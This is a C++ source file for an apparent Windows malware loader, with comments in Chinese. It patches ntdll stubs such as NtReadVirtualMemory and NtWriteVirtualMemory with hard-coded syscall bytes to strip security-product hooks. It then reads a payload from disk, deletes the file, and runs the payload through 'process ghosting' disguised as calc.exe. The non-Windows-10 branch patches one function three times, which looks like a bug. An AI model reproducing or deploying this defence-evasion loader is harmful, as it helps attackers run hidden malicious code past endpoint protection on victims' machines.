
#include"ntdll_undoc.h"
#include "PG.h"
#include"pgheader.h"


typedef NTSTATUS(NTAPI* _RtlGetVersion)(
    LPOSVERSIONINFOEXW lpVersionInformation
    );
_RtlGetVersion RtlGetVersion = (_RtlGetVersion)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");

void free_buffer(BYTE* buffer, size_t buffer_size)
{
    if (buffer == NULL) return;
    VirtualFree(buffer, buffer_size, MEM_DECOMMIT);
}
BOOL Unhook_NativeAPI(int SystemCall, LPCSTR ApiName) {
    BYTE AssemblyBytes[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };

    AssemblyBytes[4] = SystemCall;//传入函数的调用号

    LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), ApiName);
    //lpapicall的值是NtReadVirtualMemory，此处获取函数的地址

    LPVOID lpBaseAddress = lpProcAddress;
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = 10;
    NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
    //修改内存为可读可写可执行
    if (status != STATUS_SUCCESS) {
        wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
        return FALSE;
    }
    status = NtWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
    if (status != STATUS_SUCCESS) {
        wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
        return FALSE;
    }
    //修改回原本的内存保护状态
    status = NtProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
    if (status != STATUS_SUCCESS) {
        wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
        return FALSE;
    }

    return TRUE;
}

int wmain(int argc, wchar_t* argv[])
{
    OSVERSIONINFOEXW osInfo;
    RtlGetVersion(&osInfo);
    DWORD version = osInfo.dwMajorVersion;
    if (version == 10) {
        Unhook_NativeAPI(0x3F, "NtReadVirtualMemory");
        Unhook_NativeAPI(0x18, "NtAllocateVirtualMemory");
        Unhook_NativeAPI(0x3a, "NtWriteVirtualMemory");

    }
    else {
        Unhook_NativeAPI(0x3c, "NtReadVirtualMemory");
        Unhook_NativeAPI(0x15, "NtReadVirtualMemory");
        Unhook_NativeAPI(0x37, "NtReadVirtualMemory");
    }
    //bypass ntcreateprocess()

    if (!init_ntdll_func()) {
        return -1;
    }
    wchar_t target[MAX_PATH] = { 0 };
    if (!get_calc_path(target, MAX_PATH))
        return -1;
    wchar_t* targetPath = target;
    wchar_t* payloadPath = argv[1];
    size_t payloadSize = 0;
    BYTE* payladBuf = buffer_payload(payloadPath, payloadSize);
    if (payladBuf == NULL) {
        cout<< "Cannot read payload!\n" <<endl;
        return -1;
    }
    if (!DeleteFileW(payloadPath)) {
        cout << "delete fail!\n" << endl;
    }
    bool is_ok = process_ghost(targetPath, payladBuf, (DWORD)payloadSize);
    free_buffer(payladBuf, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    }
    else {
        std::cerr << "[-] Failed!" << std::endl;
    }
    
}


